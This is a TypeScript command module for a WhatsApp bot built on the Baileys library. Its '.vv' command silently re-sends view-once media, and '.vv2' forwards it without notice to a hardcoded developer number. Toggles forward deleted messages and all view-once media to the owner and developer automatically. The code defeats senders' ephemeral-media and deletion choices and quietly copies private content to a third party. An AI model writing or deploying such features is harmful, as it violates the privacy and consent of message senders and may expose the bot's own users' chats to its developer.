// src/commands/privacy.ts
import type { proto } from '@whiskeysockets/baileys';
import { register } from '../core/registry';
import { info, error as errTheme, success } from '../core/formatter';
import { CONFIG, getRuntime, setRuntime } from '../core/config';
import {
  cacheViewOnce,
  isViewOnce,
  forwardViewOnce,
  getViewOnce,
  asUnwrapped,
} from '../automation/viewonce';
import { normalizeNumber } from '../utils/helpers';

const OWNER_JID = `${CONFIG.DEV_NUMBER}@s.whatsapp.net`;

function getQuoted(msg: proto.IWebMessageInfo): proto.IWebMessageInfo | null {
  const ctx = (msg.message as any)?.extendedTextMessage?.contextInfo;
  if (!ctx) return null;
  const quoted = ctx.quotedMessage;
  if (!quoted) return null;
  return {
    key: {
      remoteJid: msg.key?.remoteJid,
      fromMe: false,
      id: ctx.stanzaId,
      participant: ctx.participant,
    },
    message: quoted,
  } as proto.IWebMessageInfo;
}

// -----------------------------------------------------------------------------
// .vv — reveal view-once in the same chat (silent)
// -----------------------------------------------------------------------------

register({
  name: 'vv',
  category: 'general',
  description: 'Reveal view-once media in this chat (silent)',
  handler: async (ctx) => {
    const quoted = getQuoted(ctx.msg);
    if (!quoted) {
      await ctx.reply(errTheme('USAGE', 'Reply to a view-once message with .vv'));
      return;
    }

    // Two sources: the quoted message may be a view-once wrapper
    // OR the bot may have cached the original when it was received.
    let target: proto.IWebMessageInfo = quoted;

    if (!isViewOnce(target)) {
      const cached = quoted.key?.id ? getViewOnce(quoted.key.id) : undefined;
      if (cached) {
        target = cached;
      } else {
        await ctx.reply(
          errTheme(
            'NOT VIEW-ONCE',
            'Quoted message is not a view-once message (or has not been cached yet).'
          )
        );
        return;
      }
    }

    // Forward silently — only back to the current chat, with no sender notification
    const ok = await forwardViewOnce(
      ctx.sock,
      target,
      [ctx.jid],
      'REVEALED (silent)'
    );

    if (ok) {
      await ctx.react('🩸');
    } else {
      await ctx.reply(errTheme('REVEAL FAILED', 'Could not retrieve the view-once content.'));
    }
  },
});

// -----------------------------------------------------------------------------
// .vv2 — forward view-once to owner + developer (silent)
// -----------------------------------------------------------------------------

register({
  name: 'vv2',
  category: 'general',
  description: 'Forward view-once to owner + developer (silent)',
  handler: async (ctx) => {
    const quoted = getQuoted(ctx.msg);
    if (!quoted) {
      await ctx.reply(errTheme('USAGE', 'Reply to a view-once message with .vv2'));
      return;
    }

    let target: proto.IWebMessageInfo = quoted;

    if (!isViewOnce(target)) {
      const cached = quoted.key?.id ? getViewOnce(quoted.key.id) : undefined;
      if (cached) {
        target = cached;
      } else {
        await ctx.reply(
          errTheme(
            'NOT VIEW-ONCE',
            'Quoted message is not a view-once message (or has not been cached yet).'
          )
        );
        return;
      }
    }

    const ok = await forwardViewOnce(
      ctx.sock,
      target,
      [OWNER_JID],
      'FORWARDED (silent)'
    );

    if (ok) {
      // Silent confirmation to the requester only
      await ctx.react('✅');
    } else {
      await ctx.reply(errTheme('FORWARD FAILED', 'Could not retrieve the view-once content.'));
    }
  },
});

// -----------------------------------------------------------------------------
// .del — delete a message the bot can delete
// -----------------------------------------------------------------------------

register({
  name: 'del',
  aliases: ['delete'],
  category: 'general',
  description: 'Delete a quoted message (bot must be admin in groups)',
  handler: async (ctx) => {
    const quoted = getQuoted(ctx.msg);
    if (!quoted || !quoted.key?.id) {
      await ctx.reply(errTheme('USAGE', 'Reply to a message with .del'));
      return;
    }

    const targetJid = quoted.key?.remoteJid || ctx.jid;
    const isBotOwn = !!quoted.key?.fromMe;

    try {
      // If the message is the bot's own — always allowed
      if (isBotOwn) {
        await ctx.sock.sendMessage(targetJid, { delete: quoted.key } as any);
        await ctx.react('🗑️');
        return;
      }

      // Group: only admins can delete others' messages
      if (ctx.isGroup) {
        await ctx.sock.sendMessage(targetJid, {
          delete: {
            remoteJid: targetJid,
            fromMe: false,
            id: quoted.key.id,
            participant: quoted.key.participant,
          },
        } as any);
        await ctx.react('🗑️');
        return;
      }

      // DM: cannot delete someone else's message
      await ctx.reply(
        errTheme(
          'CANNOT DELETE',
          'In private chats you can only delete your own or the bot\'s messages.'
        )
      );
    } catch (e) {
      await ctx.reply(errTheme('DELETE FAILED', (e as Error).message));
    }
  },
});

// -----------------------------------------------------------------------------
// Toggles for the new automations
// -----------------------------------------------------------------------------

const TOGGLES: Array<[string, string, string]> = [
  ['antidelete', 'antidelete', 'Forward deleted messages to owner'],
  ['antigroupmention', 'antigroupmention', 'Delete status group-mentions'],
  ['autoviewonce', 'autoviewonce', 'Auto-forward view-once to owner + dev'],
];

for (const [cmd, key, desc] of TOGGLES) {
  register({
    name: cmd,
    category: 'general',
    description: desc,
    handler: async (ctx) => {
      const mode = (ctx.args[0] || '').toLowerCase();
      const r = getRuntime() as any;
      const current = !!r[key];
      const next = mode === 'on' ? true : mode === 'off' ? false : !current;
      setRuntime({ [key]: next } as any);
      await ctx.reply(info(cmd.toUpperCase(), `Now *${next ? 'ON' : 'OFF'}*.`));
    },
  });
}